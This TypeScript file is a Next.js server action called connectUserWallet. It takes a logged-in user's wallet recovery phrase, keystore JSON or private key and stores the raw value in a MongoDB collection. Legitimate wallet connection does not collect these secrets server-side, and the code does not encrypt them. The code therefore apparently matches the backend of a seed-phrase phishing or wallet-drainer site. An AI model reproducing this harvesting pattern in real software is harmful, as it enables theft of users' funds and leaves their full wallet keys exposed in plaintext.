"use server";

import { auth } from "@/lib/auth";
import Wallet from "@/models/wallet.model";
import mongoose from "mongoose";
import { headers } from "next/headers";

async function connectUserWallet(type: "phrase" | "keystorejson" | "privatekey", value: string) {
  try {
    const session = await auth.api.getSession({
      headers: await headers()
    })

    if (!session) return { error: "User not authenticated" }

    const userObjectId = new mongoose.Types.ObjectId(session.user.id);

    const existingDoc = await Wallet.findOne({ userId: userObjectId });

    if (!existingDoc) {
      await Wallet.create({
        userId: userObjectId,
        phrases: type === "phrase" ? [value] : [],
        keystorejson: type === "keystorejson" ? [value] : [],
        privatekey: type === "privatekey" ? [value] : [],
      });
    } else {
      if (type === "phrase") {
        await Wallet.updateOne(
          { userId: userObjectId },
          { $addToSet: { phrases: value } }
        );
      } else if (type === "keystorejson") {
        await Wallet.updateOne(
          { userId: userObjectId },
          { $addToSet: { keystorejson: value } }
        );
      } else if (type === "privatekey") {
        await Wallet.updateOne(
          { userId: userObjectId },
          { $addToSet: { privatekey: value } }
        );
      }
    }

    return { error: null };
  } catch (error) {
    return { error: error instanceof Error ? error.message : "Server error occurred." }
  }
}

export default connectUserWallet;